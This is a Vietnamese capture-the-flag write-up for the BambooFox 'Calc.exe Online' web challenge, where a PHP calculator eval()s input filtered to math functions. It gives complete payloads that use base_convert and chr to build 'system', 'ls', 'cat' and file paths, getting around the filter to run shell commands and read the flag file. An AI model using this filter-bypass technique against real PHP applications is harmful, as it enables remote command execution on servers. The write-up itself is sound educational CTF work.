# write up

Chall: http://chall.ctf.bamboofox.tw:13377/

Source: https://github.com/rimc2t/write-up-cho-vui/blob/main/BambooFox-CTF/%5BWeb%5D%20Calc.exe%20Online/source.php

Cùng nhìn tổng quan đề bài 1 xíu nhé!!!!

## Overview

![hinh1](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/139404612_1360916280927703_9149939801016827697_n.png?_nc_cat=110&ccb=2&_nc_sid=730e14&_nc_ohc=ve9-OBZQPt4AX9JueT5&_nc_ht=scontent.fsgn2-6.fna&oh=0f8e721f4bf481312e71ad7a610e3cb4&oe=6028F116)

Ctr+U coi đi kiếm source xíu. Ồ cho file source nè:

![hinh3](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/138395872_1360917480927583_7950565622394537985_n.png?_nc_cat=100&ccb=2&_nc_sid=730e14&_nc_ohc=HMV2LUg9jkUAX8eqRtb&_nc_ht=scontent.fsgn2-6.fna&oh=37fd2f612f637ea1f216aa900d2adc8c&oe=602818A5)

![hinh4](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/139193741_1360967837589214_4621736347075272027_n.png?_nc_cat=100&ccb=2&_nc_sid=730e14&_nc_ohc=7aM6q8fo3K8AX8SNyCb&_nc_ht=scontent.fsgn2-6.fna&oh=c0f13bebd2a13e2a6328c4dab36ed650&oe=60280BD5)

Nào như mọi lần tui bắt đầu đi đọc code và kết luận vài dòng:

- Đây là code php
- Có 2 cái function
- Param của mình truyền vào là đi qua hàm **safe_eval**
- Trong **safe_eval**, nó đưa param của mình cho **is_safe** kiểm tra
- Trong **is_safe**, nó bắt đầu chạy code các kiểu -> tóm tắt lại rằng: Chỉ được dùng các hàm trong toàn học, và toán tử +-\*/
- Sau khi **is_safe** true sẽ cho chúng ta thực thi (eval), ngược lại sẽ xuất ra màn hình 1 chuỗi.

> Vậy giải pháp rút ra là phải inject vào 1 đoạn code sao cho hàm **is_safe** trả về true rồi tạo thành 1 command có nghĩa để thực thi được đến server server.

## SEEKING
Mình là một con gà mờ về ctf. Nên khi đọc vào trong đầu nghĩ là *"Ủa? sao được ta? hàm của toán để nó thành command có nghĩa kiểu gì?"*. Quyết định ăn miếng bánh thư giãn cho đầu óc suy nghĩ ngoài cái hộp. Ngẫm nghĩ lại lúc trước có làm (đọc write up làm theo) một số bài web thì các bài liên quan đến **eval()** thì exploit trực tiếp vô luôn, còn cái này có *filter* thì thường dùng những kỹ thuật xor hay bằng cách nào đấy biến số thành chữ.

>Thế là mình quyết định đi tìm các hàm biến số thành chữ hêh

Lúc đầu đi tìm thì mình thấy 1 vài hàm như **dechex** **decoct** thì mình dzui vì thấy có khả năng, mà nghĩ lại: *"Ủa :)) phải có đủ bảng chữ cái chứ, hong ổn rồi"*
Một hồi mình nhìn kỹ xíu nữa thì thấy 1 hàm **base_convert**, hehe nghe xịn mình liền lên w3school tìm hướng dẫn sử dụng (tại w3 có chỗ debug luôn nên mình ưu tiên).

![hinh5](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/139701687_1360932737592724_2820394334159202042_n.png?_nc_cat=100&ccb=2&_nc_sid=730e14&_nc_ohc=HND36JbcqNYAX_Rhwq7&_nc_ht=scontent.fsgn2-6.fna&oh=ddfb680eaf96e04f88bb9ba9b463eed4&oe=6027B6DF)

![hinh6](https://scontent.fsgn2-3.fna.fbcdn.net/v/t1.0-9/139477082_1360935034259161_5270276016675269189_n.png?_nc_cat=106&ccb=2&_nc_sid=730e14&_nc_ohc=yYgHu-x5GasAX9knpwh&_nc_ht=scontent.fsgn2-3.fna&oh=98630cfbf2d6a09f6fb8def9ee4edaf9&oe=60291091)

Thử chuyển hệ 36 sang hệ 10 luôn nè:

![hinh7](https://scontent.fsgn2-3.fna.fbcdn.net/v/t1.0-9/139718552_1360935947592403_3256650028083666150_n.png?_nc_cat=106&ccb=2&_nc_sid=730e14&_nc_ohc=mLDYAutpJscAX_No6zB&_nc_ht=scontent.fsgn2-3.fna&oh=93b0061201edcfdda66df394016cf1c4&oe=6029D635)

Hehe boizzz, ngonnnnn

>Sau khi đã tìm được hồ cá, lượm được cần câu. Giờ phải dùng kỹ năng đi câu hoyyyyyyyyy

## INJECTION
Quay lại với hình 1 nhé, coi lại chỗ để nhập phép tính. Trong đầu phải ghi nhớ rằng: *"Bây giờ phải dùng **base_convert** để biến những con số thành 1 command có nghĩa rồi bỏ vô payload này nhaaaa"*

### system(ls)

>system():					base_convert(1751504350,10,36)()

>ls:						    base_convert(784,10,36)

>**PAYLOAD: base_convert(1751504350,10,36)(base_convert(784,10,36))**

Sau đó sẽ trả về kết quả:

![hinh8](https://scontent.fsgn2-3.fna.fbcdn.net/v/t1.0-9/139471146_1360942944258370_7846989612733427119_n.png?_nc_cat=106&ccb=2&_nc_sid=730e14&_nc_ohc=x7CD47HUc1kAX85inpR&_nc_ht=scontent.fsgn2-3.fna&oh=d451023b8209c672721204c1e1177bbd&oe=6026CED9)

Ò ở đây chỉ có index chứ hong có flag :(
Mình đi ra thư mục gốc xem thử có flag ngoài đó hong

### system(ls /)
Lúc này có cái khó khăn là có khoảng trắng và dấu '/'. hmmmmm? làm shaooooo?
Mình tìm mọi cách và được chỉ dẫn đến sử dụng **ord** để lấy mã ascii 1 chữ và **chr** để đổi ascii ra ký tự. Việc mình cần làm là gọi hàm **chr** thông qua hàm **base_convert** và số (số này là đổi chuỗi "chr" từ base-36 sang base-10). Tiếp đó dùng các dấu '.' để nối các hàm lại với nhau.
>system():					base_convert(1751504350,10,36)()

>ls:						    base_convert(784,10,36)

>space:             base_convert(16191,10,36)(32)

>/:                 base_convert(16191,10,36)(47)

>**PAYLOAD: base_convert(1751504350,10,36)(base_convert(784,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(47))**

Nhận ngay kết quả: 

![hinh9](https://scontent.fsgn2-4.fna.fbcdn.net/v/t1.0-9/137328100_1360948444257820_2551682331755669394_n.png?_nc_cat=101&ccb=2&_nc_sid=730e14&_nc_ohc=LNzI_tUCEPsAX9gLo1d&_nc_ht=scontent.fsgn2-4.fna&oh=113d5590d5f2fa6155970803f6328907&oe=60294521)

Á à thì ra flag nằm ngày đây: **flag_a2647e5eb8e9e767fe298aa012a49b50**
Giờ thì mình mở ra xem hoyyyyy

### system(cat /flag_a2647e5eb8e9e767fe298aa012a49b50)

>system():					                   base_convert(1751504350,10,36)()

>cat:						                      base_convert(15941,10,36)

>space:						                    .base_convert(16191,10,36)(32)

>/:						                        .base_convert(16191,10,36)(47)

>flag:					                    	.base_convert(727432,10,36)

>_:				                         		.base_convert(16191,10,36)(95)

>a2647e5eb8e9e767fe298aa012a49b50):		.base_convert(788365066082,10,36)

>						                         	.base_convert(880282369231,10,36)

>						                         	.base_convert(1206073849608,10,36)

>					                        		.base_convert(83329543332,10,36)


Đoạn nào chữ thôi thì mình chỉ cnầ dùng **base_convert** còn đoạn nào có ký tự đặc biệt thì mình kết hợp với **chr** (16191 base36) nữa nhé!
Ở chuỗi chữ và số dài loằng ngoằng kia ban đầu mình chỉ dùng 1 lần **base_convert** nhưng mà nó bị tràn số ra kết quả hong chính xác nên mình chia thành 4 đoạn.
Giờ chỉ cần ghép lại tất cả để có payload chính xác:

>>**PAYLOAD: base_convert(1751504350,10,36)(base_convert(15941,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(47).base_convert(727432,10,36).base_convert(16191,10,36)(95).base_convert(788365066082,10,36).base_convert(880282369231,10,36).base_convert(1206073849608,10,36).base_convert(83329543332,10,36)) **

Hơi dài nhưng chỉ 405chars vẫn thỏa < 1024 của đề bài. Cuối cùng nhận được kết quả:

![hinh10](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/139449877_1360956844256980_5107937802172987774_n.png?_nc_cat=110&ccb=2&_nc_sid=730e14&_nc_ohc=c2LKQLlWJnwAX8XJqRI&_nc_ht=scontent.fsgn2-6.fna&oh=652d2a0cf660532758b0dfc732742e23&oe=60277931)


***Trên đây là tất cả write-up của mình về bài "Calc.exe Onl", trình còn kém nên làm còn mơ hồ, diễn giải có thể màu mè hoặc không đúng. Mong bạn đọc có thể đóng góp ý kiến <3 Chân thành cảm ơn!***
